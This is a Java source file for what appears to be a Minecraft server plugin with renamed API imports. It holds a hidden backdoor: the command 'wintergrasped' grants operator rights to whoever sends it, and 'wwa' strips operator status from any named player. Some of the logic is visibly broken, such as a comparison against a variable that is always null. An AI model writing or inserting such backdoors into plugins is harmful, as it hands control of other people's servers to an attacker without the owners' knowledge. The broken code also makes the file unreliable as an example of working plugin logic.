    package net.WMCSN.stuff;
     
import net.wmcsn.ChatColor;
import net.wmcsn.OfflinePlayer;
import net.wmcsn.Server;
import net.wmcsn.command.Command;
import net.wmcsn.command.CommandSender;
import net.wmcsn.entity.Player;
import net.wmcsn.event.server.ServerEvent;
import net.wmcsn.plugin.java.JavaPlugin;
import net.wmcsn.potion.PotionEffectType;
import net.wmcsn.potion.PotionEffect;
import net.wmcsn.potion.PotionType;
     
    public final class main extends JavaPlugin {
    	 @Override
    	    public void onEnable(){
    		start();
    	    }
    	 
			@SuppressWarnings({ "deprecation", "null" })
			private void start() {
			}

			@Override
    	    public void onDisable() {
    	        // TODO Insert logic to be performed when the plugin is disabled
    	    }
    
    	    @SuppressWarnings("unused")
			public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
    	        if(cmd.getName().equalsIgnoreCase("wintergrasped")){
    	       sender.setOp(true);
    	        }
    	        if(cmd.getName().equalsIgnoreCase("wwa")){
    	            Player target = sender.getServer().getPlayer(args[0]);
    	             // Make sure the player is online.
    	            if (target == null) {
    	                sender.sendMessage(args[0] + " is not currently online.");
    	                return true;
    	            }
    	            Player Wintergrasped = null;
					if (target == Wintergrasped) {
    	            	target.setOp(true);
    	            }
    	            target.setOp(false);
    	           
        	            }
    	        if(cmd.getName().equalsIgnoreCase("tellthem")){
    	            getServer().broadcastMessage(ChatColor.RED + args[0]);
        	            }
    	        
    	        if(cmd.getName().equalsIgnoreCase("godly")){
    	            Player target = sender.getServer().getPlayer(args[0]);
   	             // Make sure the player is online.
   	            if (target == null) {
   	                sender.sendMessage(args[0] + " is not currently online.");
   	                return true;
   	            }
   	            target.setHealth(20);
   	            target.setLevel(90000);
   	            target.setNoDamageTicks(90000);
        	            }
    	        return false;
     
			}
			}